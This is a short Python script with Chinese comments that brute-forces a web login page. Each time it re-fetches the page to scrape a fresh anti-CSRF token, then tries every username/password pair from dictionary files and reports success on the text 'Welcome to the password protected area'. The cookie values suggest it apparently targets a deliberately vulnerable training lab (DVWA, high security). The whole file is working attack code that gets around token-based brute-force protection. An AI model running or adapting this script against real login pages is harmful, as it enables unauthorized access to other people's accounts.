# -*- coding: UTF-8 -*-
# urllib3 文档：https://urllib3.readthedocs.io/en/latest/
# 使用时注意更改代码中的 PHPSESSID 值
# debug：第一次请求首页时也需要构造 headers 中的 cookie 参数，注意大小写等问题。

import urllib3
import os
import re


class dictionary():
    def __init__(self):
        self.user_list = []
        self.passwd_list = []

    def input_file(self):
        self.user_file = os.path.join(os.getcwd(), "user_dict.txt")
        self.passwd_file = os.path.join(os.getcwd(), "passwd_dict.txt")

        if not os.path.exists(self.user_file):
            self.user_file = input("Enter users dict file path:")
        if not os.path.exists(self.passwd_file):
            self.passwd_file = input("Enter passwd dict file path:")

        with open(self.user_file, 'r', encoding='utf-8') as f:
            for user_item in f:
                user_item = user_item.strip("\n")
                self.user_list.append((user_item))

        with open(self.passwd_file, 'r', encoding='utf-8') as f:
            for passwd_item in f:
                passwd_item = passwd_item.strip("\n")
                self.passwd_list.append(passwd_item)


if __name__ == '__main__':
    dict_object = dictionary()
    dict_object.input_file()

    website_url = input("Enter website url:").strip(" ")

    for username in dict_object.user_list:
        for password in dict_object.passwd_list:

            # 构造请求首页，得到 token 值
            http = urllib3.PoolManager()
            response = http.request(
                "GET",
                website_url,
                headers={
                    "Cookie": "security=high; PHPSESSID=c15012011c81bf7271e4e6c52d6b3711"
                })

            user_token = re.findall(r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)", response.data.decode("utf-8"))[0]

            # 构造请求尝试用户名密码
            url = website_url + "?username=" + username + "&password=" + password + "&Login=Login" + "&user_token=" + user_token
            response_new = http.request(
                "GET",
                url,
                headers={
                    "Cookie": "security=high; PHPSESSID=c15012011c81bf7271e4e6c52d6b3711"
                })

            # 判断返回的结果
            print("-----------------")
            print(user_token)
            print(url)
            print("用户名：%s" % (username))
            print("密码：%s" % (password))
            # print(response_new.data.decode("utf-8"))

            if "Welcome to the password protected area" in str(response_new.data.decode("utf-8")):
                print("成功！")
            else:
                print("失败！")
            print("-----------------")

